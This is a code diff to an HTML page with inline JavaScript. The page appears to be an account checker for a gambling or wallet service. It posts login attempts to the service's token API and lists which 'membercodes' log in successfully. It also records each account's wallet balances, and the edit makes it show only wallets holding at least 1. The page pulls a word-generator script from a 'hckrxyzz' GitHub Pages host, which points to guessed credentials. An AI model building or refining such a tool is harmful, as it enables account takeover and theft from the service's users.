@@ -325,7 +325,7 @@
                             <th>BALANCE</th>
                         </tr>
                     </thead>
-                    <tbody id="tableBody"> 
+                    <tbody id="tableBody">
                         <tr>
                             <td>membercode</td>
                             <td>main</td>
@@ -333,9 +333,9 @@
                         </tr>
                     </tbody>
                 </table>
-                   <div class="container-fluid border shadow text-center bg-primary">
-                  <h5 class="text-info">SUCCESSFULL MEMBERCODES</h5>
-                   </div>
+                <div class="container-fluid border shadow text-center bg-primary">
+                    <h5 class="text-info">SUCCESSFULL MEMBERCODES</h5>
+                </div>
                 <div id="successOutput" class="container-fluid border" style="column-count: 5; margin-top: 10px;"></div>
             </div>
             <!-- Logo Popup Modal -->
@@ -356,7 +356,7 @@
                     </div>
                 </div>
             </div>
-
+        </div>
     </main>
     <footer class="fixed-bottom">
         <div class="mt-5 p-4 text-center">
@@ -414,7 +414,6 @@
                 option: "2",
             };
 
-            // Ensure the POST request is made only once per login attempt
             let loginResponse, loginResult;
             try {
                 loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
@@ -456,12 +455,13 @@
                 }));
                 displaySuccessResponse(username, wallets);
 
-                // Create and append wallet info elements
                 const tableBody = document.getElementById("tableBody");
-                wallets.forEach(wallet => {
-                    const tr = document.createElement('tr');
-                    tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${wallet.balance}</td>`;
-                    tableBody.appendChild(tr);
+                wallets.forEach(wallet =>  {
+                    if (parseFloat(wallet.balance) >= 1) {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${wallet.balance}</td>`;
+                        tableBody.appendChild(tr);
+                    }
                 });
 
                 successfulLogins.push({
@@ -472,11 +472,8 @@
         }
 
         function displaySuccessResponse(username, wallets) {
-            // Update successful usernames in localStorage
             successfulLogins.push(username);
-            localStorage.setItem('success', successfulLogins.join(','));
-
-            // Display successful usernames as <ul><li>
+            localStorage.setItem('success', successfulLogins.map(u => typeof u === 'string' ? u : u.username).join(','));
             const successOutput = document.getElementById("successOutput");
             let ol = successOutput.querySelector('ol');
             if (!ol) {
@@ -488,8 +485,6 @@
             li.textContent = username;
             ol.appendChild(li);
         }
-
-        // Creates a div with a span for username and balance, and adds it to #successOutput
         function createUserBalanceDiv(username, balance) {
             const tableBody = document.getElementById("tableBody");
             const tr = document.createElement('tr');
@@ -533,7 +528,6 @@
         }
     </script>
     <script src="https://hckrxyzz.github.io/js/wordgenarate.js"></script>
- <script src="https://hckrxyzz.github.io/js/a.js"></script>
-            
 </body>
+
 </html>
